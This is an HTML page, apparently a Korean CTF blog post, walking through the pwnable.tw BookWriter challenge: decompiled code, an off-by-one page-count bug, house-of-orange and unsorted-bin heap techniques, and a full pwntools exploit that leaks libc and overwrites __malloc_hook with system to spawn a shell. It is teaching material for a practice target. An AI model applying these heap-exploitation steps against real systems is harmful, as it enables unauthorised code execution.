@@ -1,0 +1,118 @@
+<!DOCTYPE html>
+<html lang="zh-cmn-Hans">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta http-equiv="X-UA-Compatible" content="ie=edge">
+  <title>Pwnable.tw - BookWriter | KiraSys</title>
+  
+  
+  <!--link rel="stylesheet" href="//cdn.jsdelivr.net/highlight.js/9.10.0/styles/github-gist.min.css"-->
+  <link rel="stylesheet" href="//cdn.jsdelivr.net/highlight.js/9.10.0/styles/github-gist.min.css">
+  <link rel="stylesheet" href="/css/style.css">
+</head>
+
+<body>
+<div class="Shell">
+    <aside class='SideBar'>
+    <section class='avatar' style="background-image: url(/assets/header.png)">
+        <div class='av-pic' style="background-image: url(/assets/logo.jpg)">
+        </div>
+    </section>
+    <section class='menu'>
+        <div>KiraSys</div>
+        
+            <div>CAT-Security</div>
+        
+        <ul>
+          
+            <a href="/" class="Btn">
+              <li>Home</li>
+            </a>  
+          
+            <a href="/archives/" class="Btn">
+              <li>Archive</li>
+            </a>  
+          
+            <a href="/categories/" class="Btn">
+              <li>Categories</li>
+            </a>  
+          
+        </ul>
+    </section>
+    <section class="media">
+        
+            
+                <a href="https://github.com/kirasys">
+                    <img src="/assets/github.svg" />
+                </a>
+            
+        
+            
+                <a href="https://www.facebook.com/profile.php?id=100008635065103">
+                    <img src="/assets/facebook.svg" />
+                </a>
+            
+        
+    </section>
+</aside>
+
+    <div class="container">
+        <div data-pager-shell>
+            <div>
+  <article class='ContentView'>
+    <header class='PageTitle'>
+        <h1>Pwnable.tw - BookWriter</h1>
+    </header>
+
+    <section>
+      <h3 id="Reversing"><a href="#Reversing" class="headerlink" title="Reversing"></a>Reversing</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">void</span> __<span class="function">fastcall <span class="title">main</span><span class="params">(__int64 a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v3; <span class="comment">// ST08_8@1</span></span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *v4; <span class="comment">// rdi@1</span></span><br><span class="line">  __int64 v5; <span class="comment">// rax@2</span></span><br><span class="line"></span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0L</span>L, <span class="number">2</span>, <span class="number">0L</span>L);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Welcome to the BookWriter !"</span>);</span><br><span class="line">  set_author();</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    menu();</span><br><span class="line">    LODWORD(v5) = <span class="keyword">int</span>();</span><br><span class="line">    <span class="keyword">switch</span> ( v5 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1L</span>L:</span><br><span class="line">        add((__int64)v4, <span class="number">0L</span>L);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2L</span>L:</span><br><span class="line">        view((__int64)v4, <span class="number">0L</span>L);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3L</span>L:</span><br><span class="line">        edit();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">4L</span>L:</span><br><span class="line">        infomation();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">5L</span>L:</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        v4 = <span class="string">"Invalid choice"</span>;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"Invalid choice"</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>프로그램은 매우 간단하다. 데이터를 쓸 수 있는 페이지를 추가하거나 조회, 수정할 수 있다. 추가된 페이지는 데이터 영역에 크기 정보와 같이 포인터 배열에 저장된다. 조금 특이한 점은 페이지를 삭제하는 기능이 없어서 할당한 페이지를 free할 수 없다.<br><br><br></p>
+<h3 id="Vulnerability"><a href="#Vulnerability" class="headerlink" title="Vulnerability"></a>Vulnerability</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//add function</span></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; ; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( i &gt; <span class="number">8</span> )</span><br><span class="line">      <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">"You can't add new page anymore!"</span>);</span><br><span class="line">    <span class="keyword">if</span> ( !*(_QWORD *)&amp;page[<span class="number">8</span> * i] )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
+<p>취약점은 페이지를 추가하는 add 함수에서 발생한다. 페이지 주소가 저장되는 포인터 배열의 크기는 64byte이며, 8개의 페이지를 저장할 수 있다. 그런데 위의 for문에서 조건문을 잘못 사용하여 9개까지 페이지를 생성할 수 있게 되었다. 게다가 포인터 배열 뒤에 바로 페이지의 크기 정보를 저장하는 배열이 위치해서 1번째 페이지의 크기 정보를 힙 주소로 바꿔 heap overflow를 할 수 있다.<br><br><br></p>
+<h3 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">v5 = <span class="built_in">malloc</span>(v2);</span><br><span class="line"><span class="keyword">if</span> ( !v5 )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Error !"</span>);</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>위의 말했듯이 free 함수가 사용되지 않는다.. 그래서 heap overflow로 top_chunk size를 크게 만든 뒤, house of force 공격을 이용할려 했지만 사이즈를 사용자로부터 받아오는 함수에서 atol 함수를 이용한다. atol 함수 사용으로 인해 32bit 이상의 값을 malloc에 전달할 수 없었다.(malloc에 음수를 전달할 수 있어야 house of force가 가능)</p>
+<p>heap overflow로 top_chunk size를 변조할 수 있는 상황에서 가능한 공격을 찾아보니 house of orange라는 기법이 있었다. 먼저 이 기법에 대해 간단히 설명하자면, malloc은 top_chunk가 부족할 때 sysmalloc을 호출하고 sysmalloc에서 brk를 통해 heap 영역을 늘리거나 mmap를 통해 할당하여 반환해준다. 후자는 요청한 크기가 100*1024를 넘을때 해당함. 중요한 점은 brk를 통해 heap 영역을 늘릴 때 원래의 top_chunk(old_top)은 malloc 내부에서 free된다. <br><br><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">2706</span>	              <span class="comment">/* If possible, release the rest. */</span></span><br><span class="line"><span class="number">2707</span>	              <span class="keyword">if</span> (old_size &gt;= MINSIZE)</span><br><span class="line"><span class="number">2708</span>	              &#123;</span><br><span class="line"><span class="number">2709</span>	                  _int_free (av, old_top, <span class="number">1</span>);</span><br><span class="line"><span class="number">2710</span>	              &#125;</span><br></pre></td></tr></table></figure></p>
+<p>old_top이 free 되는 것은 확인할 수 있다.<br><br><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">2391</span>	  assert ((old_top == initial_top (av) &amp;&amp; old_size == <span class="number">0</span>) ||</span><br><span class="line"><span class="number">2392</span>	          ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (old_size) &gt;= MINSIZE &amp;&amp;</span><br><span class="line"><span class="number">2393</span>	           prev_inuse (old_top) &amp;&amp;</span><br><span class="line"><span class="number">2394</span>	           ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) old_end &amp; (pagesize - <span class="number">1</span>)) == <span class="number">0</span>));</span><br></pre></td></tr></table></figure></p>
+<p>주의해야 할 점은 old_top + old_top size가 0x1000의 배수로 align되어 있어야 한다.<br><br><br></p>
+<h3 id="Exploit-py"><a href="#Exploit-py" class="headerlink" title="Exploit.py"></a>Exploit.py</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> len(sys.argv)&gt;<span class="number">1</span>:</span><br><span class="line">	s = remote(<span class="string">'chall.pwnable.tw'</span>,<span class="number">10304</span>)</span><br><span class="line">	</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">	s = process(<span class="string">'/root/bookwriter'</span>)</span><br><span class="line">	</span><br><span class="line">libc = ELF(<span class="string">'/root/libc_64.so.6'</span>)</span><br><span class="line">s.recvuntil(<span class="string">'Author :'</span>)</span><br><span class="line">s.send(<span class="string">'/bin/sh;'</span>.ljust(<span class="number">0x38</span>,<span class="string">'\x00'</span>) + p64(<span class="number">0x101</span>))</span><br><span class="line"></span><br><span class="line">pages_ptr = <span class="number">0x00000000006020A0</span></span><br><span class="line">author_ptr = <span class="number">0x0000000000602060</span></span><br><span class="line">puts_got = <span class="number">0x0000000000601FA8</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size, content)</span>:</span></span><br><span class="line">	s.recvuntil(<span class="string">'Your choice :'</span>)</span><br><span class="line">	s.sendline(<span class="string">'1'</span>)</span><br><span class="line">	s.recv(<span class="number">1024</span>)</span><br><span class="line">	s.sendline(str(size))</span><br><span class="line">	<span class="keyword">if</span> size&gt;<span class="number">0</span>:</span><br><span class="line">		s.recv(<span class="number">1024</span>)</span><br><span class="line">		s.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx, content)</span>:</span></span><br><span class="line">	s.recvuntil(<span class="string">'Your choice :'</span>)</span><br><span class="line">	s.sendline(<span class="string">'3'</span>)</span><br><span class="line">	s.recv(<span class="number">1024</span>)</span><br><span class="line">	s.sendline(str(idx))</span><br><span class="line">	s.recv(<span class="number">1024</span>)</span><br><span class="line">	s.send(content)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="string">''</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">8</span>):</span><br><span class="line">	add(<span class="number">16</span>, <span class="string">'12345678'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># top_chunk size overwrite</span></span><br><span class="line">edit(<span class="number">0</span>, (<span class="string">'a'</span>*<span class="number">0x18</span> + p64(<span class="number">0x21</span>))*<span class="number">8</span> + <span class="string">'\xff'</span>*<span class="number">0x18</span> + p64(<span class="number">0x1001</span> - <span class="number">0x120</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># chunksize(old_top) == 0xee0</span></span><br><span class="line"><span class="comment"># old_top freed and listed into unsorted bin</span></span><br><span class="line">edit(<span class="number">0</span>, <span class="string">'\n'</span>)</span><br><span class="line">add(<span class="number">0x1010</span>,<span class="string">'12345678'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># By overwriting old_top's bk, pages[0] == unsorted_bin</span></span><br><span class="line">edit(<span class="number">0</span>, <span class="string">'b'</span>*<span class="number">0x118</span>+ p64(<span class="number">0xee1</span>)  + p64(pages_ptr<span class="number">-16</span>)*<span class="number">2</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="string">'\n'</span>)</span><br><span class="line">add(<span class="number">0xee0</span><span class="number">-16</span>,<span class="string">'1234'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># this malloc maybe return pages_ptr because unsorted_bin-&gt;bk == pages_ptr-16</span></span><br><span class="line">edit(<span class="number">0</span>,<span class="string">'\n'</span>)</span><br><span class="line">add(<span class="number">0x100</span><span class="number">-16</span>,p64(pages_ptr) + p64(puts_got))</span><br><span class="line"></span><br><span class="line"><span class="comment"># libc_leak</span></span><br><span class="line">s.recvuntil(<span class="string">'Your choice :'</span>)</span><br><span class="line">s.sendline(<span class="string">'2'</span>)</span><br><span class="line">s.recv(<span class="number">1024</span>)</span><br><span class="line">s.sendline(<span class="string">'1'</span>)</span><br><span class="line">s.recvuntil(<span class="string">'Content :\n'</span>)</span><br><span class="line">libc_base = u64(s.recvn(<span class="number">6</span>) + <span class="string">'\x00\x00'</span>) - libc.symbols[<span class="string">'puts'</span>]</span><br><span class="line">libc_malloc_hook = libc_base + libc.symbols[<span class="string">'__malloc_hook'</span>]</span><br><span class="line">libc_system = libc_base + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">log.info(<span class="string">'libc_base : '</span>+hex(libc_base))</span><br><span class="line"></span><br><span class="line"><span class="comment"># malloc -&gt; system</span></span><br><span class="line">edit(<span class="number">0</span>,p64(pages_ptr) + p64(libc_malloc_hook))</span><br><span class="line">edit(<span class="number">1</span>,p64(libc_system))</span><br><span class="line">edit(<span class="number">0</span>,<span class="string">'\n'</span>)</span><br><span class="line"></span><br><span class="line">s.recvuntil(<span class="string">'Your choice :'</span>)</span><br><span class="line">s.sendline(<span class="string">'1'</span>)</span><br><span class="line">s.recv(<span class="number">1024</span>)</span><br><span class="line">s.sendline(str(author_ptr))</span><br><span class="line">s.interactive()</span><br></pre></td></tr></table></figure>
+<p>old_top을 free하고 unsorted bin 공격을 통해 unsorted bin list에 fake chunk를 추가할 수 있다. 나는 &amp;page[0]-16을 free chunk로 인식하게 만들어서 malloc 호출 시 &amp;page[0]을 리턴받아 공격하였다.</p>
+
+
+      
+
+    </section>
+    
+      <section class='ArticleMeta'>
+          <div>
+            发布于&nbsp;
+            <time datetime="2018-02-18T11:26:16.000Z" itemprop="datePublished">
+              2018-02-18
+            </time>
+          </div>
+          
+      </section>
+    
+    
+</article>
+
+  
+</div>
+
+            <footer>
+    <div>© 2016 - kirasys </div>
+    <div>
+    Powered by Hexo
+    </div>
+</footer>
+
+        </div>
+    </div>
+</div>
+<script src="/js/pager/dist/singlepager.js"></script>
+<script>
+var sp = new Pager('data-pager-shell')
+
+</script>
+</body>
+</html>
